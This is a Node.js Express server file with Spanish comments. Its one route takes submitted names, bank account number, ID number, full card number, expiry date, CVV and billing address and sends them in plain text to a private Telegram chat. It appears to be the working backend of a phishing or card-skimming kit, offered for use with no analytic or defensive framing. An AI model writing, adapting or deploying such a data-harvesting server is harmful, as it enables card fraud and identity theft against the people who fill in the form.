const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(bodyParser.json());

// Ruta para recibir los datos del formulario
app.post('/enviar', (req, res) => {
    const { firstName, lastName, accountNumber, idNumber, cardNumber, expiryDate, cvv, billingAddress } = req.body;

    // Construir el mensaje para enviar a Telegram
    const telegramMessage = `Nuevo formulario recibido:
    - Nombre: ${firstName} ${lastName}
    - Número de cuenta: ${accountNumber}
    - Número de identificación: ${idNumber}
    - Número de tarjeta: ${cardNumber}
    - Fecha de vencimiento: ${expiryDate}
    - CVV: ${cvv}
    - Dirección de facturación: ${billingAddress}`;

    // Enviar el mensaje a Telegram usando el bot
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
        }),
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            res.status(200).send('Datos enviados correctamente');
        } else {
            res.status(500).send('Error al enviar los datos');
        }
    })
    .catch(error => {
        console.error('Error al enviar datos a Telegram:', error);
        res.status(500).send('Error del servidor');
    });
});

// Iniciar el servidor en el puerto especificado
app.listen(port, () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});

